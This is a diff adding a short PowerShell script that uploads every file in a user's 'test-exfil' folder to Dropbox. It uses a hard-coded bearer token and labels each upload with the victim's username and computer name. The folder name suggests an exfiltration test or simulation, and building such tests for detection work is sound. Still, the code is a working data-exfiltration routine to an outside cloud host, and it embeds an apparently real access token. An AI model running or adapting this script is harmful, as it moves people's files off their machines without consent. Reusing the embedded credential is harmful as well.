@@ -1,0 +1,14 @@
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+$AccessToken = 'sl.BfGqwOGIdwK7eBbAWoA5Gbc-jL4MJGNx34CDc4xXmeeMqSZWgxhmdh5U9uV8U2AvJ7_eAD1i5MvNg2MKmFhAzk5LNHWVylvy9_JOnGknuy5x7tbPtZ0tv8ztLHplz0dHJ-pi87o';
+$files = Get-ChildItem "C:\Users\$env:USERNAME\test-exfil";
+foreach ($f in $files){
+    $TargetPath = "/$env:USERNAME-$env:COMPUTERNAME/" + $f.Name;
+    $SourcePath = $f.FullName;
+    $body = '{ "path": "' + $TargetPath + '", "mode": "overwrite" }';
+    $authorization = "Bearer $AccessToken";
+    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]";
+    $headers.Add("Dropbox-API-Arg", $body);
+    $headers.Add("Authorization", $authorization);
+    $headers.Add("Content-Type", 'application/octet-stream');
+    Invoke-RestMethod -Uri 'https://content.dropboxapi.com/2/files/upload' -Method Post -InFile $SourcePath -Headers $headers;
+}
